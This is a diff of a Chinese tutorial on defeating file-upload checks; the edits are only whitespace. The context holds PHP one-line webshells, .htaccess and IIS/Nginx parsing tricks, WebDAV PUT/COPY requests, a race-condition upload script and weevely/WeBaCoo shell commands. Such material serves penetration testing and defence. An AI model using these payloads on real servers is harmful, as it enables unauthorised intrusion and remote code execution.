@@ -130,7 +130,6 @@ Windows系统下，如果上传的文件名为test.php::$DATA，则会在服务�
 在PHP5.3之后的版本中完全修复了00截断。并且00截断受限于GPC，addslashes函数。
 
 00截断主要是绕过检测扩展名。下面给个asp简单的伪代码
-
 ```
 name=getname(http request)     //假如这时候获取到的文件名是test.asp .jpg（asp后面是0x00）
 type=gettype(name)            //而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg
@@ -152,7 +151,6 @@ htaccess文件是Apache服务器中的一个配置文件，它负责相关目录
 其中.htaccess文件内容：`SetHandler application/x-httpd-php`是设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当做PHP执行，不符合则报错。
 
 在Apache中如果需要启动.htaccess，必须在http.conf中设置AllowOverride。
-
 ```
 DocumentRoot "C:\phpStudy\PHPTutorial\WWW"
 <Directory /> 
@@ -165,7 +163,6 @@ DocumentRoot "C:\phpStudy\PHPTutorial\WWW"
 ```
 
 如果在Apache中.htaccess可被执行，且可被上传，那就可以尝试在.htaccess中写入：
-
 ```
 <FilesMatch "shell.jpg">SetHandler application/x-httpd-php</FilesMatch>
 ```
@@ -211,7 +208,6 @@ DocumentRoot "C:\phpStudy\PHPTutorial\WWW"
 #### 2. 文件相关信息检测绕过
 
 图像文件相关信息检测常用的就是getimagesize()函数，只需要把文件头部分伪造好久可以绕过，就是在幻数的基础上还加了一些文件信息，文件结构大致可以如下：
-
 ```
 GIF89a
 (...一些图片特有的二进制数据...)
@@ -235,7 +231,6 @@ GIF89a
 ## 0x07 添加表单提交按钮上传
 
 有些表单没有提交按钮，那么可以在Firebug或者浏览器开发者工具中，在HTML中添加一个submit按钮，代码如下，用来提交，但前提是后台接收表单上传并保存文件。
-
 ```html
 <input type="submit" value="提交" name='bb'>
 ```
@@ -253,7 +248,6 @@ GIF89a
 ## 0x09 突破文件大小限制
 
 上传小Webshell，再上传大Webshell上传小Webshell，以绕过上传过程中对文件大小等限制，从而能够更加有效上传大Webshell。小Webshell：
-
 ```php
 <html>
 <head>
@@ -288,7 +282,7 @@ echo "Store in : "."1.php";
 
 在网站下建立文件夹的名字为.asp或.asa的文件夹，其目录内的任何扩展名的文件都会被IIS当做asp文件来解析并执行。
 
-例如：创建目录test.asp，上传1.jpg到/test.asp目录下（即上传文件名为/test.asp/1.jpg的文件），那么上传的文件将会保存在/test.asp目录下并命名为1.jpg，它可以被当做asp文件来执行。假如攻击者可以控制上传文件夹路径，就可以不管上传后的图片改不改名，都能拿shell了。
+例如：创建目录test.asp，上传1.jpg到/test.asp目录下（即上传文件名为/test.asp/1.jpg 的文件），那么上传的文件将会保存在/test.asp目录下并命名为1.jpg，它可以被当做asp文件来执行。假如攻击者可以控制上传文件夹路径，就可以不管上传后的图片改不改名，都能拿shell了。
 
 - 文件解析（xx.asp;.jpg）
 
@@ -313,14 +307,12 @@ echo "Store in : "."1.php";
 WebDAV 基于HTTP1.1协议的通信协议使得HTTP支持PUT MOVE COPY DELETE 方法。
 
 - 探测是否存在IIS PUT漏洞
-
 ```
 OPTIONS / HTTP1.1
 Host: www.xxx.com
 ```
 
 - 上传txt文本文件
-
 ```
 PUT /a.txt HTTP1.1
 Host: www.xxx.com
@@ -330,7 +322,6 @@ Content-Length:30
 ```
 
 - 通过Move或Copy重名
-
 ```
 COPY /a.txt HTTP1.1
 Host: www.xxx.com
@@ -338,7 +329,6 @@ Destination: http://www.xxx.com/cmd.asp
 ```
 
 - 删除
-
 ```
 DELETE /a.txt HTTP1.1
 Host: www.xxx.com
@@ -370,19 +360,18 @@ test.php.rar.jpg.png
 
 php低版本可能为5.6.3及以下。
 
-可以用test.jpg/.php去测试一下。
+可以用test.jpg/.php 去测试一下。
 
 - 第一种解析漏洞
 
 在默认Fast-CGI开启状况下，攻击者上传一个名字为test.jpg，文件内容为
-
 ```php
 <?php fputs(fopen('shell.php', 'w'), '<?php eval($_POST[cmd])?>');?>
 ```
 
-然后访问test.jpg/.php，在这个目录下就会生成一句话木马shell.php。
+然后访问test.jpg/.php ，在这个目录下就会生成一句话木马shell.php。
 
-再如：/test.gif/*.php触发漏洞，会把前面上传的文件test.gif当做php执行。
+再如：/test.gif/*.php 触发漏洞，会把前面上传的文件test.gif当做php执行。
 
 - 第二种解析漏洞
 
@@ -419,7 +408,6 @@ Nginx在图片中嵌入PHP代码，然后通过访问xxx.jpg%00.php来执行代�
 首先不断访问代码文件，然后上传，最终使用菜刀连接一句话webshell。
 
 - python编写脚本，发送http请求（可多线程加速）
-
 ```python
 import requests
 while True:  
@@ -427,7 +415,6 @@ while True:
 ```
 
 - 然后执行python脚本，接着才上传文件。上传文件代码如下
-
 ```php
 <?php
     fputs(fopen('shell.php','w'),'<?php @eval($_POST["cmd"])?>');
@@ -469,7 +456,6 @@ Kali下生成webshell
 #### 1. WeBaCoo工具
 
 WeBaCoo生成Webshell：
-
 ```
 webacoo -g -o [webshell名]
 如：
@@ -477,7 +463,6 @@ webacoo -g -o a.php
 ```
 
 上传Webshell后连接Webshell：
-
 ```
 webacoo -t -u [Webshell地址]
 如：
@@ -487,7 +472,6 @@ webacoo -t -u http://127.0.0.1/a.php
 #### 2. weevely工具
 
 生成Webshell：
-
 ```
 weevely generate [密码] [路径] [文件名]
 如：
@@ -495,7 +479,6 @@ weevely generate cmd ./ a.php
 ```
 
 上传后连接Webshell：
-
 ```
 weevely [shell文件地址] [密码]
 如：
